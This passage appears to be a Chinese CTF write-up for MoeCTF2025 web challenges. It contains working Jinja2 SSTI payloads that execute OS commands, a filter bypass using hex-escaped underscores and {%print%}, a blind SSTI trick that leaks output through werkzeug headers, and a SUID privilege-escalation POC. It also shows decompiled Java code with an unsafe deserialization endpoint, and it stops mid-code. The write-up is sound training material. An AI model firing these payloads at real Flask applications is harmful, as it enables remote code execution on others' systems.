<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>username直接拼接，直接打ssti吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">141</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env&#x27;</span>).read()&#125;&#125;&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a><strong>21 第二十一章 往生漩涡·言灵死局</strong></h2><h3 id="SSTI-过滤"><a href="#SSTI-过滤" class="headerlink" title="#SSTI+过滤"></a>#SSTI+过滤</h3><p>增加了黑名单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;global&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>直接绕过就行，不是很难，关键字global和下划线可以用字符串拼接或者编码绕过，而<code>&#123;&#123;&#125;&#125;</code>的话用<code>&#123;%pring()%&#125;</code>就行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;%print(&quot;&quot;[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fbase\x5f\x5f&#x27;][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[141][&#x27;\x5f\x5finit\x5f\x5f&#x27;][&#x27;\x5f\x5fglo&#x27;+&#x27;bals\x5f\x5f&#x27;][&#x27;popen&#x27;](&#x27;whoami&#x27;).read())%&#125;&amp;password=1</span><br></pre></td></tr></table></figure>

<h2 id="22-第二十二章-血海核心·千年手段"><a href="#22-第二十二章-血海核心·千年手段" class="headerlink" title="22 第二十二章 血海核心·千年手段"></a><strong>22 第二十二章 血海核心·千年手段</strong></h2><h3 id="无回显SSTI-提权"><a href="#无回显SSTI-提权" class="headerlink" title="#无回显SSTI+提权"></a>#无回显SSTI+提权</h3><p>无回显SSTI，参考文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tammy66/articles/18616135#ssti%E6%97%A0%E5%9B%9E%E6%98%BE%E5%A4%84%E7%90%86">https://www.cnblogs.com/tammy66/articles/18616135#ssti%E6%97%A0%E5%9B%9E%E6%98%BE%E5%A4%84%E7%90%86</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=&#123;&#123;lipsum.__globals__.__builtins__.<span class="built_in">setattr</span>(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,<span class="string">&quot;protocol_version&quot;</span>,lipsum.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250924170239147.png" alt="image-20250924170239147"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=&#123;&#123;lipsum.__globals__.__builtins__.<span class="built_in">setattr</span>(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,<span class="string">&quot;sys_version&quot;</span>,lipsum.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>但是根目录的flag貌似是设置了权限的</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250924170619321.png" alt="image-20250924170619321"></p>
<p>需要提权啊？看看SUID位工具</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250924170755308.png" alt="image-20250924170755308"></p>
<p>用rev也没打出来？<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/rev/">https://gtfobins.github.io/gtfobins/rev/</a></p>
<p>后面问了几个师傅，才知道rev是经过修改的而不是原生的，所以这里需要把rev搞到本地去逆向分析一下，直接创static目录然后复制rev到这里就能访问下载了</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250924181348408.png" alt="image-20250924181348408"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; argc &gt; i + <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;--HDdss&quot;</span>, argv[i]) )</span><br><span class="line">      execvp(argv[i + <span class="number">1</span>], (<span class="type">char</span> *<span class="type">const</span> *)&amp;argv[i + <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话会从<code>arg[1]</code>开始遍历参数，先判断是否有<code>--HDdss</code>参数，如果有的话就执行execvp，执行下一个参数对应的程序，并将其后的参数作为参数传递给该程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> execvp(file, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>execvp函数接收的是一个程序名加参数，详细的可以去看源码，最后的poc就是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev --HDdss <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<h2 id="23-第二十三章-幻境迷心·皇陨星沉-大结局"><a href="#23-第二十三章-幻境迷心·皇陨星沉-大结局" class="headerlink" title="23 第二十三章 幻境迷心·皇陨星沉(大结局)"></a><strong>23 第二十三章 幻境迷心·皇陨星沉(大结局)</strong></h2><h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="#java反序列化"></a>#java反序列化</h3><p>很感谢infer师傅利用这道题给我讲了怎么去操作和利用附件jar包，我这里也写个大致的流程</p>
<p>jar包丢jadx -&gt; 在文件里面选择全部导出到一个空目录jar（此时会获得sources和resources两个目录文件夹）-&gt; 在sources中把除了源码外的目录删除（这道题里面是com目录为源码目录），然后在com目录中还有一个非源码目录，也删掉 -&gt; 进入resources\BOOT-INF把lib目录移动到resources目录 -&gt; 将整个jar目录用idea打开 -&gt; 将sources目录标记为源代码根目录，将resources&#x2F;lib目录添加为库</p>
<p>然后就可以啦</p>
<p>回归做题，我们先看看控制器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.Dog.Dog;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.Dog.DogService;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.DeleteMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/dogs&quot;&#125;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">/* loaded from: demo.jar:BOOT-INF/classes/com/example/demo/controller/DogController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DogController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DogService dogService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DogController</span><span class="params">(DogService dogService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dogService = dogService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Dog&gt; <span class="title function_">getAllDogs</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.dogService.getAllDogs();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">addDog</span><span class="params">(<span class="meta">@RequestParam</span> String name, <span class="meta">@RequestParam</span> String breed, <span class="meta">@RequestParam</span> <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.dogService.addDog(name, breed, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/&#123;id&#125;/feed&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">feedDog</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.dogService.feedDog(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DeleteMapping(&#123;&quot;/&#123;id&#125;&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">removeDog</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.dogService.removeDog(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/export&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exportDogs</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.dogService.exportDogsBase64();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/import&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">importDogs</span><span class="params">(<span class="meta">@RequestParam(&quot;data&quot;)</span> String base64Data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dogService.importDogsBase64(base64Data);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;导入成功！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DogService</code> 是业务逻辑层，用来处理狗狗相关的操作。</p>
<p>然后看看com&#x2F;example&#x2F;demo&#x2F;Dog&#x2F;DogService.java逻辑处理函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.Dog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="comment">/* loaded from: demo.jar:BOOT-INF/classes/com/example/demo/Dog/DogService.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DogService</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, Dog&gt; dogs = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Dog&gt; <span class="title function_">getAllDogs</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>(<span class="built_in">this</span>.dogs.values());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">addDog</span><span class="params">(String name, String breed, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="built_in">this</span>.nextId;</span><br><span class="line">        <span class="built_in">this</span>.nextId = i + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(i, name, breed, age);</span><br><span class="line">        <span class="built_in">this</span>.dogs.put(Integer.valueOf(dog.getId()), dog);</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">feedDog</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="built_in">this</span>.dogs.get(Integer.valueOf(id));</span><br><span class="line">        <span class="keyword">if</span> (dog != <span class="literal">null</span>) &#123;</span><br><span class="line">            dog.feed();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">removeDog</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.dogs.remove(Integer.valueOf(id));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">chainWagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Dog dog : <span class="built_in">this</span>.dogs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">                input = dog.object;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);</span><br><span class="line">            input = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exportDogsBase64</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">th</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">th2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        oos.writeObject(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(<span class="built_in">this</span>.dogs.values()));</span><br><span class="line">                        oos.flush();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">encodeToString</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">                        <span class="keyword">if</span> (oos != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="number">0</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    oos.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable th3) &#123;</span><br><span class="line">                                    th2.addSuppressed(th3);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                oos.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> encodeToString;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable th4) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (oos != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (th2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    oos.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable th5) &#123;</span><br><span class="line">                                    th2.addSuppressed(th5);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                oos.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">throw</span> th4;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (baos != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="number">0</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            baos.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable th6) &#123;</span><br><span class="line">                            th.addSuppressed(th6);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        baos.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">importDogsBase64</span><span class="params">(String base64Data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64Data));</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">th</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span 